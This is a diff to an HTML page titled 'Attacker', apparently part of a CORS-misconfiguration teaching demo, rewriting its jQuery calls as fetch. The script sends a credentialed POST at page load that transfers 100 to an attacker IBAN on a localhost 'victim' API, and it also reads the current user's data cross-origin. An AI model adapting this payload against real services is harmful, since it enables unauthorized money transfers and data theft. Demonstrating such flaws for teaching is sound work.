@@ -3,7 +3,6 @@
 <head>
     <title>Attacker</title>
     <link href="toastr.min.css" rel="stylesheet"/>
-    <script src="jquery-1.12.2.min.js" type="text/javascript"></script>
     <script src="toastr.min.js" type="text/javascript"></script>
 </head>
 
@@ -46,34 +45,28 @@
 
     <script type="text/javascript">
         function transferAmount() {
-            $.ajax({ //  this js is loaded from :9999 (hacker website),or injected via XSS
-                url: "http://localhost:8080/api/victim/transfer-rest",
+            // this js is loaded from :9999 (hacker website), or injected via XSS
+            fetch("http://localhost:8080/api/victim/transfer-rest", {
                 method: "POST",
-                xhrFields: {withCredentials: true}, // CORS sending credentials
-                data: JSON.stringify({
+                credentials: "include", // CORS sending credentials
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
                     recipientFullName: "Attacker",
                     recipientIban: "ATACKERIBAN013213",
                     amount: "100"
-                }),
-                contentType: "application/json",
-                success: function (trainings) {
-                    toastr.success("Money Transferred")
-                },
-                error: function (error) {
-                    // toastr.error("Failed to Transfer!");
-                }
-            });
+                })
+            })
+                .then(r => r.ok ? toastr.success("Money Transferred") : null)
+                .catch(() => {});
         }
 
         transferAmount();// automatically at page load
 
         function getCurrentUser() {
-            $.ajax("http://localhost:8080/api/user/current", {
-                method: "GET",
-                success: function (trainings) {
-                    toastr.success("CORS allows reading data:  " + JSON.stringify(trainings));
-                }
-            });
+            fetch("http://localhost:8080/api/user/current")
+                .then(r => r.json())
+                .then(data => toastr.success("CORS allows reading data:  " + JSON.stringify(data)))
+                .catch(() => {});
         }
     </script>
 </div>
